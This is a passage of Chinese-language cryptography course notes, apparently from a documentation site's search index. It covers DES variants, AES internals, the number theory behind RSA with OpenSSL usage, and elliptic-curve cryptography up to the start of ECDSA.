<li>\u7f6e\u6362\u540e\u5f97\u5230 f \u51fd\u6570\u7684\u8f93\u51fa</li> </ul> </li> </ul> </li> <li>DES \u89e3\u5bc6\uff1a\u548c\u52a0\u5bc6\u8fc7\u7a0b\u76f8\u540c\uff0c\u5c06\u5b50\u5bc6\u94a5\u9006\u5e8f\u5373\u53ef\u201c\u4ece\u540e\u5f80\u524d\u201d\u9006\u63a8 16 \u8f6e</li> <li>\u4e0a\u8ff0\u52a0\u89e3\u5bc6\u90fd\u662f\u9488\u5bf9\u4e00\u4e2a\u5757\u7684\uff0c\u53ef\u4ee5\u914d\u5408 ECB CBC CFB \u7b49\u5206\u7ec4\u52a0\u5bc6\u6a21\u5f0f\u4f7f\u7528</li> <li>openssl<ul> <li>DES_ncbc_encrypt     <pre><code>DES_cblock iv = {0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xED};\nunsigned char key[8] = ...;\ndes_key_schedule ks;\ndes_set_key((DES_cblock *)k, ks);\nDES_ncbc_encrypt(plain, cipher, strlen(plain), &amp;ks, &amp;iv, DES_ENCRYPT);\n// \u89e3\u5bc6\u5c06\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u6539\u4e3a DES_DECRYPT\n</code></pre></li> <li>DES_cfb_encrypt<ul> <li>\u5199\u6cd5\u548c ncbc \u57fa\u672c\u4e00\u81f4</li> </ul> </li> </ul> </li> <li>\u53cc\u91cd DES<ul> <li>\\(C = \\mathrm{enc}(\\mathrm{enc}(P, K_1), K_2)\\)\uff0c\u9884\u671f\u662f\u4f7f\u5bc6\u94a5\u53d8\u4e3a 112 \u4f4d\uff0c\u589e\u5927\u679a\u4e3e\u96be\u5ea6</li> <li>meet in the middle attack <ul> <li>\u679a\u4e3e \\(K_1\\)\uff0c\u8ba1\u7b97 \\(\\mathrm{enc}(P, K_1)\\)\uff0c\u5f97\u5230\u4e00\u7cfb\u5217 \\(P'\\)</li> <li>\u679a\u4e3e \\(K_2\\)\uff0c\u8ba1\u7b97 \\(\\mathrm{dec}(C, K_2)\\)\uff0c\u5f97\u5230\u4e00\u7cfb\u5217 \\(C'\\)</li> <li>\u679a\u4e3e \\(K_2\\) \u8fc7\u7a0b\u4e2d\u68c0\u67e5 \\(C'\\) \u662f\u5426\u51fa\u73b0\u5728\u524d\u9762\u4e00\u7cfb\u5217 \\(P'\\) \u4e2d\u5373\u53ef</li> <li>\u96be\u5ea6\u6700\u5927\u624d 2^57 \u6b21\u679a\u4e3e\uff0c\u53ea\u589e\u5f3a\u4e86\u4e00\u500d</li> </ul> </li> </ul> </li> <li>\u4e09\u91cd DES<ul> <li>\\(C = \\mathrm{enc}(\\mathrm{dec}(\\mathrm{enc}(P, K_1), K_2), K_3)\\)</li> <li>\\(P = \\mathrm{dec}(\\mathrm{enc}(\\mathrm{dec}(C, K_3), K_2), K_1)\\)</li> <li>\u7f3a\u70b9\uff1a\u52a0\u5bc6\u901f\u5ea6\u6162\uff0c\u5bc6\u94a5\u957f\u5ea6\u957f</li> </ul> </li> </ul>"},{"location":"sec/crypto/#aes","title":"AES","text":""},{"location":"sec/crypto/#_9","title":"\u6709\u9650\u57df","text":"<ul> <li>AES \u4f7f\u7528 \\(GF(2^8)\\) \u4f3d\u7f57\u74e6\u57df\uff0c\u4e0d\u53ef\u7ea6\u591a\u9879\u5f0f\u4e3a \\(x^8 + x^4 + x^3 + x + 1\\)<ul> <li>\u4e8c\u8fdb\u5236\u4e3a 100011011\uff0c\u5341\u516d\u8fdb\u5236\u4e3a 0x11B</li> </ul> </li> <li>\\(GF(2^8)\\) \u4e0a\u6bcf\u4e2a\u591a\u9879\u5f0f\u90fd\u53ef\u4ee5\u8868\u793a\u4e3a\u4e00\u4e2a 8 \u4f4d\u4e8c\u8fdb\u5236\u6570</li> <li>\u52a0\u6cd5\uff1a\u4e8c\u8fdb\u5236\u5f02\u6216</li> <li>\u4e58\u6cd5\uff1a\u591a\u9879\u5f0f\u4e58\u6cd5\uff08\u6ce8\u610f\u52a0\u662f\u5f02\u6216\uff09\uff0c\u6a21 \\(x^8 + x^4 + x^3 + x + 1\\)<ul> <li>\u624b\u5de5\u8ba1\u7b97\uff0c\u957f\u9664\u6cd5\u7b97\u6a21</li> <li>\u519c\u592b\u7b97\u6cd5     <pre><code>unsigned int p = 0; // \u7ed3\u679c\nfor (int i = 0; i &lt; 8; ++i) {\n    if (y &amp; 1) p ^= x;  // y \u53f3\u79fb\u4e22\u5931 1 \u5219 p += x\n    y &gt;&gt;= 1;\n    x &lt;&lt;= 1;\n    if (x &amp; 0x100) x ^= 0x11B; // x \u5de6\u79fb\u8fdb\u4f4d 1 \u5219 x -= 0x11B\n}\n</code></pre></li> </ul> </li> </ul>"},{"location":"sec/crypto/#aes_1","title":"AES \u7b97\u6cd5","text":"<ul> <li>\u6bcf\u6b21 128 \u4f4d\uff0816 \u5b57\u8282\uff09\u5206\u7ec4\uff0c\u5bc6\u94a5\u957f\u5ea6 128/192/256 \u4f4d\uff0816/24/32 \u5b57\u8282\uff09</li> <li>\u6bcf\u4e00\u5757\u660e\u6587\u8f6c\u4e3a 4*4 \u7684\u77e9\u9635\uff0c\\(\\mathbf{S}_{i\\bmod 4, i/4} = \\mathbf{byte}_i\\)\uff08\u4ece\u4e0a\u5230\u4e0b\u4ece\u5de6\u5230\u53f3\uff09</li> <li>\u8fdb\u884c\u591a\u8f6e\u52a0\u5bc6\uff08128 \u4f4d\u5bc6\u94a5\u8fdb\u884c 10 \u8f6e\uff09\uff0c\u6bcf\u8f6e\u90fd\u6709\u4e00\u4e2a\u5bc6\u94a5\uff0c\u4e5f\u662f 4*4 \u77e9\u9635</li> <li>\u52a0\u5bc6\u8fc7\u7a0b\uff08p \u4e3a\u660e\u6587\u77e9\u9635\uff0ck \u4e3a\u5bc6\u94a5\u77e9\u9635\uff09\uff1a     <pre><code>unsigned char a[4] = {0x03, 0x01, 0x01, 0x02};\nAddRoundKey(p, k);\nfor (int i = 1; i &lt;= 10; ++i) {\n    ByteSub(p, 16);\n    ShiftRow(p);\n    if (i != 10) MixColumn(p, a);\n    AddRoundKey(p, k + 16 * i);\n}\n</code></pre></li> <li>AddRoundKey \u77e9\u9635\u5f02\u6216</li> <li>ByteSub \u9010\u5b57\u8282\u8fdb\u884c sbox \u7f6e\u6362\uff1ap[i] = sbox[p[i]]<ul> <li>sbox \u751f\u6210\uff1a\\(\\mathrm{sbox}_a = ((a^{-1}\\times \\mathtt{0x1F})\\bmod (x^8+1))\\oplus \\mathtt{0x63}\\) <pre><code>for (int i = 0; i &lt; 256; ++i) {\n    sbox[i] = aes_8bit_mul_mod_0x101(aes_8bit_inverse(i), 0x1F) ^ 0x63;\n}\n</code></pre></li> </ul> </li> <li>ShiftRow \u884c\u79fb\u4f4d<ul> <li>\u7b2c\u4e00\u884c\u4e0d\u53d8\uff0c\u7b2c\u4e8c\u884c\u5faa\u73af\u5de6\u79fb 1 \u4f4d\uff0c\u7b2c\u4e09\u884c\u5faa\u73af\u5de6\u79fb 2 \u4f4d\uff0c\u7b2c\u56db\u884c\u5faa\u73af\u5de6\u79fb 3 \u4f4d <pre><code>0 1 2 3       0 1 2 3\n4 5 6 7  --&gt;  5 6 7 4\n8 9 A B       A B 8 9\nC D E F       F C D E\n</code></pre></li> </ul> </li> <li>MixColumn \u5217\u6df7\u6dc6<ul> <li>\u53d6\u51fa\u77e9\u9635\u7684\u6bcf\u4e00\u5217\uff0c\u4f5c\u4e3a\u4e00\u4e2a\u591a\u9879\u5f0f\uff08\u4f4e\u4f4d\u5728\u4e0a\uff09\uff0c\u4e0e \\(a(x)\\) \u76f8\u4e58\uff0c\u518d\u6a21 \\(x^4 + 1\\)<ul> <li>\u52a0\u5bc6\u65f6 \\(a(x) = 3x^3 + x^2 + x + 2\\) [0x03, 0x01, 0x01, 0x02]</li> <li>\u89e3\u5bc6\u65f6 \\(a(x) = 11x^3 + 13x^2 + 9x + 14\\) [0x0B, 0x0D, 0x09, 0x0E]</li> <li>\u6a21 \\(x^4 + 1\\) \u5c31\u76f8\u5f53\u4e8e\u628a\u8d85\u8fc7 4 \u6b21\u7684\u9879\u90fd\u51cf\u53bb \\(x^4\\)</li> </ul> </li> <li>\u4f8b\u5982\u4e00\u5217\u4ece\u4e0a\u5230\u4e0b\u4e3a [4, 3, 2, 1]\uff0c\u5219\u8fd0\u7b97\u4e3a \\[     \\begin{bmatrix}     2 &amp; 3 &amp; 1 &amp; 1 \\\\     1 &amp; 2 &amp; 3 &amp; 1 \\\\     1 &amp; 1 &amp; 2 &amp; 3 \\\\     3 &amp; 1 &amp; 1 &amp; 2     \\end{bmatrix}\\times     \\begin{bmatrix}     4 \\\\ 3 \\\\ 2 \\\\ 1     \\end{bmatrix} =     \\begin{bmatrix}     8\\oplus 1\\oplus 2\\oplus 5\\\\     \\cdots \\\\ \\cdots \\\\ \\cdots     \\end{bmatrix} =     \\begin{bmatrix}     14 \\\\ 5 \\\\ 0 \\\\ 15     \\end{bmatrix}     \\]<ul> <li>\u8fd9\u91cc\u4e58\u6cd5\u662f 8 \u4f4d mod 0x11B \u7684\u6709\u9650\u57df\u4e58\u6cd5\uff0c\u52a0\u6cd5\u662f\u5f02\u6216</li> </ul> </li> <li>\u8ba1\u7b97\u4e4b\u540e\u518d\u653e\u56de\u539f\u6765\u7684\u5217</li> </ul> </li> <li>\u5bc6\u94a5\u751f\u6210\u8fc7\u7a0b<ul> <li>\u53d6\u4e0a\u8f6e\u5bc6\u94a5\u7684\u6700\u540e\u4e00\u5217\uff0c\u5faa\u73af\u4e0a\u79fb\u4e00\u4f4d\uff0c\u8fdb\u884c ByteSub\uff0c\u4e0e\u4e0a\u8f6e\u5bc6\u94a5\u7b2c\u4e00\u5217\u5f02\u6216\uff0c\u518d\u5c06\u7b2c\u4e00\u4f4d\u548c \\(2^{i-1}\\bmod \\mathtt{0x11B}\\) \u5f02\u6216\u5f97\u5230\u65b0\u4e00\u8f6e\u5bc6\u94a5\u7684\u7b2c\u4e00\u5217<ul> <li>\u7b2c\u4e00\u4f4d\u5f02\u6216\u7684\u5206\u522b\u662f 01 02 04 08 10 20 40 80 1b 36</li> </ul> </li> <li>\u4e0a\u8f6e\u5bc6\u94a5\u7b2c\u4e8c\u5217\u5f02\u6216\u65b0\u4e00\u8f6e\u5bc6\u94a5\u7b2c\u4e00\u5217\uff0c\u5f97\u5230\u65b0\u4e00\u8f6e\u5bc6\u94a5\u7684\u7b2c\u4e8c\u5217</li> <li>\u4e0a\u8f6e\u5bc6\u94a5\u7b2c\u4e09\u5217\u5f02\u6216\u65b0\u4e00\u8f6e\u5bc6\u94a5\u7b2c\u4e8c\u5217\uff0c\u5f97\u5230\u65b0\u4e00\u8f6e\u5bc6\u94a5\u7684\u7b2c\u4e09\u5217</li> <li>\u4e0a\u8f6e\u5bc6\u94a5\u7b2c\u56db\u5217\u5f02\u6216\u65b0\u4e00\u8f6e\u5bc6\u94a5\u7b2c\u4e09\u5217\uff0c\u5f97\u5230\u65b0\u4e00\u8f6e\u5bc6\u94a5\u7684\u7b2c\u56db\u5217</li> </ul> </li> <li>\u89e3\u5bc6\u8fc7\u7a0b\u5c31\u9006\u7740\u63a8\u56de\u53bb\u5c31\u53ef\u4ee5\u4e86</li> <li>\u5c0f\u767d\u8001\u5e08\u7684\u5199\u6cd5\u6709\u4e00\u4e9b\u4e0d\u4e00\u6837\u7684\u5730\u65b9<ul> <li>\u5927\u6982\u662f\u4e3a\u4e86 memcpy \u65b9\u4fbf\u4ee5\u53ca\u540c\u4e00\u884c\u7684\u53ef\u4ee5\u5f53\u505a\u4e00\u4e2a int \u5904\u7406\uff0c\u6240\u4ee5\u597d\u591a\u5730\u65b9\u5217\u53d8\u6210\u4e86\u884c</li> <li>\u660e\u6587\u5757\u662f\u4ece\u5de6\u5230\u53f3\u4ece\u4e0a\u5230\u4e0b\u6392\u5217\u7684</li> <li>\u6bcf\u8f6e\u8fdb\u884c\u7684\u64cd\u4f5c\u4e3a\uff1a     <pre><code>ByteSub(p, 16);\nMixColumnInverse(p, a, 0);\nShiftRow(p);\nif (i != 10) MixColumn(p, a, 1);\nelse MixColumn(p, a, 0);\nAddRoundKey(p, k + 16 * i);\n</code></pre></li> <li>MixColumn \u52a0\u4e86\u4e00\u4e2a\u53c2\u6570 do_mul<ul> <li>MixColumn \u53d6\u51fa\u4e00\u5217\uff0c\u4e58\u5b8c\u653e\u56de\u4e00\u884c</li> <li>do_mul=0 \u5219\u53ea\u8fdb\u884c\u8fd9\u4e2a\u5217\u8f6c\u884c\u7684\u64cd\u4f5c</li> <li>MixColumnInverse(p, a, 0) \u4e5f\u5c31\u76f8\u5f53\u4e8e\u5c06 p \u884c\u8f6c\u5217</li> </ul> </li> <li>\u56e0\u4e3a AddRoundKey \u7684\u53c2\u6570 p \u8fd9\u65f6\u662f\u884c\u4f18\u5148\u7684\uff0c\u6240\u4ee5\u5bc6\u94a5\u7684\u8ba1\u7b97\u4e5f\u662f\u884c\u4f18\u5148\u8ba1\u7b97\u7684</li> </ul> </li> <li>openssl     <pre><code>AES_KEY k;\nAES_set_encrypt_key(\"...\", 128, &amp;k);\nAES_encrypt(plain, cipher, &amp;k);\nAES_decrypt(cipher, plain, &amp;k);\n</code></pre></li> </ul>"},{"location":"sec/crypto/#rsa","title":"RSA","text":""},{"location":"sec/crypto/#_10","title":"\u6570\u5b66\u57fa\u7840","text":"<ul> <li>\u6b27\u62c9\u51fd\u6570<ul> <li>\\(\\phi(n)\\) \u8868\u793a\u5c0f\u4e8e \\(n\\) \u4e14\u4e0e \\(n\\) \u4e92\u8d28\u7684\u6570\u7684\u4e2a\u6570</li> <li>\u82e5 \\(n_1, n_2\\) \u4e92\u7d20\uff0c\u5219 \\(\\phi(n_1n_2) = \\phi(n_1)\\phi(n_2)\\)</li> <li>\\(\\phi(n) = n\\prod_{p|n}(1-\\frac{1}{p})\\)\uff08\u5176\u4e2d \\(p\\) \u4e3a\u8d28\u6570/\u8d28\u56e0\u5b50\uff09</li> </ul> Example \\[ \\begin{aligned} \\phi(100) = 100\\times(1-\\frac{1}{2})(1-\\frac{1}{5}) = 100\\times\\frac{1}{2}\\times\\frac{4}{5} = 40\\\\ \\phi(100) = \\phi(2^2\\times 5^2) = 2^{2-1}(2-1)\\times 5^{2-1}(5-1) = 40 \\end{aligned} \\] </li> <li>\u6b27\u62c9\u5b9a\u7406<ul> <li>\u82e5 \\(a\\) \u4e0e \\(n\\) \u4e92\u8d28\uff0c\u5219 \\(a^{\\phi(n)} \\equiv 1 \\pmod{n}\\)</li> </ul> </li> <li>\u8d39\u9a6c\u5c0f\u5b9a\u7406<ul> <li>\u82e5 \\(p\\) \u4e3a\u7d20\u6570\uff0c\u4e14 \\(a\\) \u4e0e \\(p\\) \u4e92\u8d28\uff0c\u5219 \\(a^{p-1} \\equiv 1 \\pmod{p}\\)</li> <li>\u56e0\u4e3a \\(\\phi(p) = p - 1\\)</li> </ul> </li> <li>\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406<ul> <li>\u8bbe \\(m_1, m_2, \\cdots, m_r\\) \u4e24\u4e24\u4e92\u7d20\uff0c\u5219\u540c\u4f59\u65b9\u7a0b\u7ec4 \\(x \\equiv a_i \\pmod{m_i}\\) \u6a21 \\(M=m_1m_2\\cdots m_r\\) \u6709\u552f\u4e00\u89e3 \\(x = \\sum_{i=1}^ra_iM_iy_i\\bmod M\\)<ul> <li>\u5176\u4e2d \\(M_i=M/m_i\\), \\(y_i=M_i^{-1}\\bmod m_i\\)</li> </ul> </li> </ul> </li> </ul>"},{"location":"sec/crypto/#rsa_1","title":"RSA \u7b97\u6cd5","text":"<ul> <li>\u975e\u5bf9\u79f0\u5bc6\u7801\u4f53\u5236\uff0c\u6709\u516c\u94a5\u548c\u79c1\u94a5</li> <li>RSA \u7b97\u6cd5\u8fc7\u7a0b<ul> <li>\u9009\u53d6\u4e24\u4e2a\u4e0d\u76f8\u7b49\u7684\u5927\u7d20\u6570 \\(p\\) \u548c \\(q\\)\uff0c\u8ba1\u7b97 \\(n = pq\\)\uff0c\\(\\phi(n) = (p-1)(q-1)\\)<ul> <li>\\(n\\) \u516c\u5f00\uff0c\\(p\\) \u548c \\(q\\) \u4fdd\u5bc6</li> </ul> </li> <li>\u968f\u673a\u9009\u53d6\u52a0\u5bc6\u5bc6\u94a5 \\(e\\)\uff0c\u4f7f\u5f97 \\(1 &lt; e &lt; \\phi(n)\\)\uff0c\u4e14 \\(e\\) \u4e0e \\(\\phi(n)\\) \u4e92\u8d28</li> <li>\u627e\u5230 \\(d\\) \u4f7f\u5f97 \\(ed \\equiv 1 \\pmod{\\phi(n)}\\)</li> <li>\u516c\u94a5\u4e3a \\((n, e)\\)\uff0c\u79c1\u94a5\u4e3a \\((n, d)\\)</li> <li>\u52a0\u5bc6\uff1a\\(c = m^e \\bmod n\\)</li> <li>\u89e3\u5bc6\uff1a\\(m = c^d \\bmod n\\)</li> </ul> </li> <li>\u8bc1\u660e\u7565\uff0c\u5e26\u5165\u524d\u9762\u7684\u6570\u5b66\u57fa\u7840\u4e00\u901a\u5316\u5c31\u597d\u4e86</li> <li>\u5b89\u5168\u6027<ul> <li>\u80fd\u5206\u89e3 \\(n\\) \u7684\u56e0\u5b50 -&gt; \u5f97\u5230 \\(p\\) \u548c \\(q\\) -&gt; \u7834\u89e3 RSA \u4e0d\u6bd4\u56e0\u5b50\u5206\u89e3\u66f4\u56f0\u96be</li> <li>\u4e0d\u5206\u89e3\u56e0\u5b50\u76f4\u63a5\u6c42 \\(\\phi(n)\\) -&gt; \u6709 \\(\\phi(n), n\\) \u53ef\u4ee5\u76f4\u63a5\u6c42\u5f97 \\(p, q\\) -&gt; \u4e0d\u6bd4\u56e0\u5b50\u5206\u89e3\u66f4\u5bb9\u6613<ul> <li>\\(p+q=n-\\phi(n)+1\\)</li> <li>\\(p-q=\\sqrt{(p+q)^2-4n}\\)</li> </ul> </li> <li>\u4e0d\u5206\u89e3\u56e0\u5b50\u4e0d\u6c42 \\(\\phi(n)\\) \u76f4\u63a5\u6c42\u89e3 \\(d\\) -&gt; \\(ed-1\\) \u662f \\(\\phi(n)\\) \u500d\u6570 -&gt; \u540c\u6837\u53ef\u6c42 \\(p, q\\) -&gt; \u4e0d\u6bd4\u56e0\u5b50\u5206\u89e3\u66f4\u5bb9\u6613</li> <li>\u76ee\u524d \\(n\\) \u957f\u5ea6\u4e3a 1024 bit \u5230 2048 bit \u662f\u5408\u7406\u7684</li> <li>\u907f\u514d\u9009\u53d6\u5bb9\u6613\u5206\u89e3\u7684 \\(n\\)<ul> <li>\\(p, q\\) \u957f\u5ea6\u76f8\u5dee\u4e0d\u591a</li> <li>\\(p-1, q-1\\) \u6709\u5927\u7d20\u56e0\u5b50</li> <li>\\(\\gcd(p-1, q-1)\\) \u5e94\u8be5\u5f88\u5c0f</li> </ul> </li> </ul> </li> <li>openssl<ul> <li>\u5927\u6570\u76f8\u5173     <pre><code>BIGNUM *pn = BN_new();\nBN_bin2bn(buf, n, pn);\nBN_hex2bn(&amp;pn, \"...\");\nBN_CTX *ctx = BN_CTX_new();\nBN_mod_exp(pout, pin, pe, pn, ctx); // \u4e58\u65b9\u6c42\u6a21\nn = BN_bn2bin(pout, buf);\nBN_CTF_free(ctx);\nBN_free(pn);\n</code></pre><ul> <li>BN \u662f 128/256/512/1024 \u4f4d\u8bc1\u4e66</li> </ul> </li> <li>RSA \u76f8\u5173     <pre><code>RSA *rsa = RSA_new();\nrsa = RSA_generate_key(bits_len, e, NULL, NULL);\nn = RSA_public_encrypt(n, in, out, rsa, RSA_PKCS1_PADDING); // \u516c\u94a5\u52a0\u5bc6\nn = RSA_private_decrypt(n, in, out, rsa, RSA_PKCS1_PADDING); // \u79c1\u94a5\u89e3\u5bc6\nn = RSA_private_encrypt(n, in, out, rsa, RSA_PKCS1_PADDING); // \u79c1\u94a5\u52a0\u5bc6\nn = RSA_public_decrypt(n, in, out, rsa, RSA_PKCS1_PADDING); // \u516c\u94a5\u89e3\u5bc6\nRSA_free(rsa);\n</code></pre></li> <li>N \u4e3a 128 \u4f4d\u65f6\u660e\u6587\u957f\u5ea6\u4e5f\u5fc5\u987b\u662f 128 \u4f4d\uff0c\u4e14\u660e\u6587\u503c\u8981\u5c0f\u4e8e N\uff0c\u5bc6\u6587\u957f\u5ea6\u4e5f\u662f 128 \u4f4d<ul> <li>\u5982\u679c\u660e\u6587\u4f4d\u6570\u5f88\u5c0f\uff0c\\(m^e&lt;N\\)\uff0c\u5219\u89e3\u5bc6\u65f6\u4e0d\u9700\u8981\u7528\u5230 \\(d\\)\uff0c\u76f4\u63a5\u5bf9 \\(m\\) \u5f00 \\(e\\) \u6b21\u65b9\u5373\u53ef</li> </ul> </li> <li>\u6bd4\u5982\u660e\u6587 char m[] = {'A', 'B', 'C', 'D', 0, 0, ...} \u5f53\u4f5c\u5927\u6570 0x414243440000... \u5904\u7406</li> </ul> </li> <li>blinding \u6a21\u5f0f\u9632\u6b62\u4fa7\u4fe1\u9053\u8ba1\u65f6\u653b\u51fb</li> <li>\u5927\u6570\u5feb\u901f\u5e42     <pre><code>int pow_mod(int a, int p, int n) {\n    if (p == 0 &amp;&amp; n == 1) return 0;\n    if (p == 0) return 1;\n    int ans = pow_mod(a, p / 2, n); ans = ans * ans % n;\n    if (p % 2 == 1) ans = ans * a % n;\n    return ans;\n}\nint pow_mod(int a, int p, int n) {\n    a %= n; int ans = 1;\n    for (; p; p &gt;&gt;= 1, a *= a, a %= n) if(p &amp; 1) ans = ans * a % n;\n    return ans;\n}\n</code></pre></li> <li>\u6570\u5b57\u7b7e\u540d<ul> <li>\u5bf9\u6d88\u606f\u5185\u5bb9\u8fdb\u884c\u6458\u8981\uff0c\u6bd4\u5982 md5\uff0c\u5f97\u5230 M</li> <li>A \u7528\u81ea\u5df1\u7684\u79c1\u94a5\u5bf9 M \u8fdb\u884c\u52a0\u5bc6\uff0c\u5f97\u5230\u7b7e\u540d M'</li> <li>B \u7528 A \u7684\u516c\u94a5\u5bf9 M' \u89e3\u5bc6\uff0c\u5c06\u7ed3\u679c\u4e0e\u6d88\u606f\u6458\u8981 M \u6bd4\u8f83</li> </ul> </li> </ul>"},{"location":"sec/crypto/#ecc","title":"ECC","text":""},{"location":"sec/crypto/#_11","title":"\u6570\u5b66\u57fa\u7840","text":"<ul> <li>\u6709\u9650\u57df\u4e0a\u692d\u5706\u66f2\u7ebf<ul> <li>\u8bbe \\(p&gt;3\\) \u4e3a\u7d20\u6570\uff0c\u6709\u9650\u57df \\(Z_p\\) \u4e0a\u692d\u5706\u66f2\u7ebf \\(y^2=x^3+ax+b\\) \u662f\u7531\u65e0\u7a77\u8fdc\u70b9 \\(\\mathcal{O}\\) \u548c\u6ee1\u8db3 \\(y^2\\equiv x^3+ax+b\\pmod{p}\\) \u7684\u70b9 \\((x, y)\\in Z_p\\times Z_p\\) \u7ec4\u6210\u7684\u96c6\u5408 \\(E\\)<ul> <li>\u5176\u4e2d \\(a, b\\in Z_p\\)\uff0c\\(4a^3+27b^2\\not\\equiv 0\\pmod{p}\\)</li> </ul> </li> <li>\u5b9a\u4e49\u52a0\u6cd5\uff1a\\(P=(x_1, y_1)\\in E, Q=(x_2, y_2)\\in E\\)<ul> <li>\u5982\u679c \\(x_1=x_2, y_1=y_2=0\\)\uff0c\u5219 \\(P+Q=\\mathcal{O}\\)</li> <li>\u5982\u679c \\(x_1=x_2, y_1=-y_2\\neq 0\\)\uff0c\u5219 \\(P+Q=\\mathcal{O}\\)</li> <li>\u5426\u5219 \\(P+Q=(x_3, y_3)\\)<ul> <li>\\(x_3 = \\lambda^2-x_1-x_2\\)</li> <li>\\(y_3 = \\lambda(x_1-x_3)-y_1\\)</li> <li>\\(\\lambda = \\begin{cases}(y_2-y_1)(x_2-x_1)^{-1} &amp; \\text{if }P\\neq Q \\\\(3x_1^2+a)(2y_1)^{-1} &amp; \\text{if }P=Q\\end{cases}\\)</li> </ul> </li> <li>\u5b9e\u6570\u57df\u4e0a\u692d\u5706\u66f2\u7ebf\u52a0\u6cd5\u5c31\u662f\u4e24\u70b9\u8fde\u7ebf\u4e0e\u66f2\u7ebf\u7684\u4ea4\u70b9\u5173\u4e8e x \u8f74\u7684\u5bf9\u79f0\u70b9</li> </ul> Example <p>\u66f2\u7ebf \\(a=1, p=11\\)\uff0c\u6709\u70b9 \\(\\alpha=(2, 7)\\)\uff0c\u6c42 \\(2\\alpha\\) \\(\\lambda = (3x_1^2+a)(2y_1)^{-1} = (3\\times 4+1)(2\\times 7)^{-1} = 2\\times 3^{-1} = 2\\times 4 = 8\\pmod{11}\\) \\(x_3 = \\lambda^2-x_1-x_2 = 8^2-2-2 = 60 = 5\\pmod{11}\\) \\(y_3 = \\lambda(x_1-x_3)-y_1 = 8\\times(2-5)-7 = -31 = 2\\pmod{11}\\) \\(2\\alpha = (x_3, y_3) = (5, 2)\\)</p> </li> <li>\u9636<ul> <li>\u66f2\u7ebf\u7684\u9636\uff1a\\(|E|\\)\uff08\u66f2\u7ebf\u4e0a\u70b9\u7684\u4e2a\u6570\uff09</li> <li>\u70b9\u7684\u9636\uff1a\\(nP=\\mathcal{O}\\) \u7684\u6700\u5c0f\u6b63\u6574\u6570 \\(n\\)</li> </ul> </li> <li>\u751f\u6210\u5143/\u57fa\u70b9<ul> <li>\u5982\u679c\u70b9 \\(P\\) \u7684\u9636 \\(n=|E|\\)\uff0c\u79f0 \\(P\\) \u4e3a \\(E\\) \u7684\u4e00\u4e2a\u751f\u6210\u5143</li> <li>\u5982\u679c \\(P\\) \u662f \\(E\\) \u7684\u751f\u6210\u5143\uff0c\u5219 \\(E=\\{P, 2P, 3P, ..., (n-1)P, \\mathcal{O}\\}\\)</li> </ul> </li> <li>\u4e00\u6761\u692d\u5706\u66f2\u7ebf\u7531 \\(a, b, p\\)\uff0c\u57fa\u70b9 \\(G\\)\uff0c\\(G\\) \u7684\u9636\uff0c\u4f59\u56e0\u5b50\u51b3\u5b9a<ul> <li>\u4f59\u56e0\u5b50\u4e3a\u66f2\u7ebf\u7684\u9636 / \\(G\\) \u7684\u9636\uff0c\u901a\u5e38\u4e3a 1</li> </ul> </li> <li>\u79bb\u6563\u5bf9\u6570\u95ee\u9898<ul> <li>\\(P\\) \u662f \\(E\\) \u7684\u751f\u6210\u5143\uff0c\\(Q\\) \u662f \\(E\\) \u4e0a\u7684\u4efb\u610f\u70b9\uff0c\u6c42 \\(n\\) \u4f7f\u5f97 \\(nP=Q\\)</li> <li>\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u662f\u96be\u89e3\u7684\uff0c\u662f ECC \u7684\u57fa\u7840</li> </ul> </li> </ul> </li> <li>\u6b27\u62c9\u51c6\u5219<ul> <li>\u8bbe \\(p&gt;2\\) \u662f\u4e00\u4e2a\u7d20\u6570\uff0c\\(x\\) \u662f\u4e00\u4e2a\u6574\u6570\u4e0e \\(p\\) \u4e92\u7d20</li> <li>\u5982\u679c \\(y^2\\equiv x\\pmod p\\) \u6709\u89e3\uff0c\u5219\u79f0 \\(x\\) \u662f \\(p\\) \u7684\u5e73\u65b9\u5269\u4f59\uff0c\u5426\u5219\u79f0\u4e3a\u5e73\u65b9\u975e\u5269\u4f59</li> <li>\\(x\\) \u662f\u6a21 \\(p\\) \u7684\u5e73\u65b9\u5269\u4f59\u5f53\u4e14\u4ec5\u5f53 \\(x^{(p-1)/2}\\equiv 1\\pmod p\\)<ul> <li>\\(x\\) \u4e24\u4e2a\u5e73\u65b9\u6839\u4e3a \\(\\pm x^{(p+1)/4}\\bmod p\\)</li> </ul> </li> <li>\\(x\\) \u662f\u6a21 \\(p\\) \u7684\u5e73\u65b9\u975e\u5269\u4f59\u5f53\u4e14\u4ec5\u5f53 \\(x^{(p-1)/2}\\equiv -1\\pmod p\\)</li> </ul> </li> </ul>"},{"location":"sec/crypto/#ecc_1","title":"ECC \u7b97\u6cd5","text":"<ul> <li>Menezes-Vanstone \u516c\u94a5\u5bc6\u7801\u4f53\u5236<ul> <li>\\(p&gt;3\\) \u5927\u7d20\u6570\uff0c\\(Z_p\\) \u4e0a\u692d\u5706\u66f2\u7ebf \\(E\\)\uff0c\u57fa\u70b9 \\(G\\)\uff0c\\(G\\) \u7684\u9636 \\(n\\)</li> <li>\u79c1\u94a5 \\(d\\) \u662f\u4e00\u4e2a\u5c0f\u4e8e \\(n\\) \u7684\u968f\u673a\u6570</li> <li>\u516c\u94a5\u70b9 \\(R=dG\\)</li> <li>\u52a0\u5bc6\uff1a\u5bf9 \\(m\\) \u8fdb\u884c\u52a0\u5bc6\uff0c\u5f97\u5230\u5bc6\u6587\u4e24\u90e8\u5206 \\((r, s)\\)<ul> <li>\u9009\u53d6\u968f\u673a\u6570 \\(k&lt;n\\)</li> <li>\\(r=(kG)_x\\)</li> <li>\\(s=m\\times(kR)_x\\bmod n\\)</li> </ul> </li> <li>\u89e3\u5bc6\uff1a<ul> <li>\\(\\dfrac{s}{(d(kG))_x}=\\dfrac{m\\times(kR)_x}{(kdG)_x}=\\dfrac{m\\times(kdG)_x}{(kdG)_x}=\\dfrac{m\\times(kR)_x}{(kR)_x}=m\\)</li> <li>\u9700\u8981\u901a\u8fc7 \\(r\\) \u627e\u5230\u70b9 \\(kG\\)\uff0c\u7136\u540e\u5229\u7528\u79c1\u94a5\u89e3\u5bc6</li> </ul> </li> </ul> </li> <li>ecdsa \u7b7e\u540d\u9a8c\u8bc1<ul> <li>\u7b7e\u540d<ul> <li>\\(r = (kG)_x\\)</li> <li>\\(s = k^{-1}(m+rd)\\bmod p\\)</li> </ul> </li> <li>\u9a8c\u8bc1<ul> 